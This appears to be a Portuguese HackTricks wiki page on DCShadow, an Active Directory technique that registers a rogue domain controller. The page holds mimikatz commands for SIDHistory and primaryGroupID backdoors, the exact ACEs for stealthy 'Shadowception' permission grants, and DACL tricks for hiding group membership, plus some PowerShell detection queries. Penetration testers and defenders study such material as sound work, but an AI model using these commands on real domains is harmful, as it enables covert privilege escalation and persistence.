# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Informações básicas

Ele registra um **novo Controlador de Domínio** no AD e o utiliza para **pushar atributos** (SIDHistory, SPNs...) em objetos especificados **sem deixar nenhum **log** referente às **modificações**. Você **precisa de** privilégios de **DA** e estar dentro do **domínio raiz**.\
Observe que, se você usar dados incorretos, logs bastante desagradáveis aparecerão.<sup>[[2]](#references)</sup>

Para realizar o ataque, você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios de SYSTEM (você deve indicar aqui as alterações que deseja realizar), e a outra instância será usada para fazer push dos valores:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Observe que **`elevate::token`** não funcionará na sessão `mimikatz1`, pois isso elevou os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
Você também pode selecionar um objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Você pode enviar as alterações a partir de uma conta DA ou de um usuário com estas permissões mínimas:

- No **objeto do domínio**:
- _DS-Install-Replica_ (Adicionar/Remover Replica no Domínio)
- _DS-Replication-Manage-Topology_ (Gerenciar Topologia de Replicação)
- _DS-Replication-Synchronize_ (Sincronização de Replicação)
- O **objeto Sites** (e seus filhos) no **container Configuration**:
- _CreateChild e DeleteChild_
- O objeto do **computador registrado como um DC**:
- _WriteProperty_ (não Write)
- O **objeto-alvo**:
- _WriteProperty_ (não Write)

Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para conceder esses privilégios a um usuário sem privilégios (observe que isso deixará alguns logs). Isso é muito mais restritivo do que ter privilégios de DA.\
Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Isso significa que o username _**student1**_, quando conectado à máquina _**mcorp-student1**_, tem permissões de DCShadow sobre o objeto _**root1user**_.

## Usando DCShadow para criar backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abuso do grupo primário, lacunas de enumeração e detecção

- `primaryGroupID` é um atributo separado da lista `member` do grupo. DCShadow/DSInternals podem gravá-lo diretamente (por exemplo, definir `primaryGroupID=512` para **Domain Admins**) sem a aplicação das regras do LSASS no host, mas o AD ainda **move** o usuário: alterar o PGID sempre remove a associação do grupo primário anterior (o mesmo comportamento ocorre para qualquer grupo de destino), portanto não é possível manter a associação ao grupo primário antigo.<sup>[[1]](#references)</sup>
- As ferramentas padrão impedem a remoção de um usuário do grupo primário atual (`ADUC`, `Remove-ADGroupMember`), portanto alterar o PGID normalmente exige gravações diretas no diretório (DCShadow/`Set-ADDBPrimaryGroup`).
- Os relatórios de associação são inconsistentes:
- **Incluem** membros derivados do grupo primário: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Omitem** membros derivados do grupo primário: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecionando `member`, `Get-ADUser <user> -Properties memberOf`.
- As verificações recursivas podem não detectar membros do grupo primário quando o **grupo primário está aninhado** (por exemplo, o PGID do usuário aponta para um grupo aninhado dentro de Domain Admins); `Get-ADGroupMember -Recursive` ou filtros recursivos LDAP não retornarão esse usuário, a menos que a recursão resolva explicitamente os grupos primários.
- Truques com DACL: os atacantes podem **negar ReadProperty** em `primaryGroupID` no usuário (ou no atributo `member` do grupo para grupos que não sejam protegidos pelo AdminSDHolder), ocultando a associação efetiva da maioria das consultas do PowerShell; `net group` ainda resolverá a associação. Grupos protegidos pelo AdminSDHolder redefinirão essas negações.

Exemplos de detecção/monitoramento:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Faça uma verificação cruzada dos grupos privilegiados comparando a saída de `Get-ADGroupMember` com `Get-ADGroup -Properties member` ou o ADSI Edit para detectar discrepâncias introduzidas por `primaryGroupID` ou atributos ocultos.<sup>[[1]](#references)</sup>

## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)

Precisamos acrescentar as seguintes ACEs com o SID do nosso usuário ao final:<sup>[[2]](#references)</sup>

- No objeto do domínio:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- No objeto do computador do atacante: `(A;;WP;;;UserSID)`
- No objeto do usuário-alvo: `(A;;WP;;;UserSID)`
- No objeto Sites no container Configuration: `(A;CI;CCDC;;;UserSID)`

Para obter a ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Neste caso, você precisa fazer **várias alterações**, não apenas uma. Na **sessão mimikatz1** (servidor RPC), use o parâmetro **`/stack` com cada alteração**. Em seguida, use **`/push`** apenas uma vez para aplicar todas as alterações armazenadas no servidor rogue.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
